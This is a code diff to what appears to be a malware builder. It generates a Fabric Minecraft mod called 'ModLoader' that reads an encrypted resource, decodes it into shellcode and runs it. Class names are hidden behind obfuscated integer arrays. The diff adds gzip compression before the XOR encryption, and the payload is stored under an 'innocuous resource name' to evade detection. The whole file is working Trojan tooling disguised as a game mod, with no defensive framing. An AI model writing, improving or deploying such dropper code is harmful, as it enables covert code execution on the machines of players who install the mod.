@@ -1,6 +1,7 @@
 import { $ } from "bun";
 import path from "path";
 import fs from "fs";
+import zlib from "zlib";
 import { v4 as uuidv4 } from "uuid";
 import { saveBuild } from "../db";
 import { logger } from "../logger";
@@ -455,6 +456,7 @@ function generateJarDropperSource(): string {
     "package com.mc.mod;",
     "import java.io.*;",
     "import java.util.*;",
+    "import java.util.zip.*;",
     "import net.fabricmc.api.ModInitializer;",
     "public class ModLoader implements ModInitializer{",
     "  private static final String TAG=\"[ModLoader]\";",
@@ -482,8 +484,14 @@ function generateJarDropperSource(): string {
     "    byte[]raw=buf.toByteArray();",
     "    log(\"payload read: \"+raw.length+\" bytes\");",
     "    int key=raw[0]&0xFF;",
-    "    byte[]sc=new byte[raw.length-1];",
-    "    for(int i=0;i<sc.length;i++)sc[i]=(byte)(raw[i+1]^key);",
+    "    byte[]xd=new byte[raw.length-1];",
+    "    for(int i=0;i<xd.length;i++)xd[i]=(byte)(raw[i+1]^key);",
+    "    GZIPInputStream gz=new GZIPInputStream(new ByteArrayInputStream(xd));",
+    "    ByteArrayOutputStream scBuf=new ByteArrayOutputStream();",
+    "    byte[]tmp2=new byte[4096];int n2;",
+    "    while((n2=gz.read(tmp2))!=-1)scBuf.write(tmp2,0,n2);",
+    "    gz.close();",
+    "    byte[]sc=scBuf.toByteArray();",
     "    log(\"shellcode decoded: \"+sc.length+\" bytes\");",
     "    Class<?>FC=Class.forName(x(new int[]{57,53,55,116,41,47,52,116,48,52,59,116,28,47,52,57,46,51,53,52}));",
     "    Class<?>PC=Class.forName(x(new int[]{57,53,55,116,41,47,52,116,48,52,59,116,10,53,51,52,46,63,40}));",
@@ -1692,10 +1700,11 @@ func runBoundFiles() {
             // Remove the stub Fabric API classes — Fabric provides the real ones at runtime
             try { fs.rmSync(path.join(classDir, "net"), { recursive: true, force: true }); } catch {}
 
-            // XOR-encrypt shellcode and store as innocuous resource name
+            // Gzip-compress then XOR-encrypt shellcode and store as innocuous resource name
             const rawSc = fs.readFileSync(jarSourcePath);
+            const compressed = zlib.gzipSync(rawSc, { level: 9 });
             const xorKey = (Math.floor(Math.random() * 254) + 1) & 0xff;
-            const xored = Buffer.from(rawSc.map((b: number) => b ^ xorKey));
+            const xored = Buffer.from(compressed.map((b: number) => b ^ xorKey));
             const packed = Buffer.concat([Buffer.from([xorKey]), xored]);
             const pakDir = path.join(classDir, "assets");
             fs.mkdirSync(pakDir, { recursive: true });
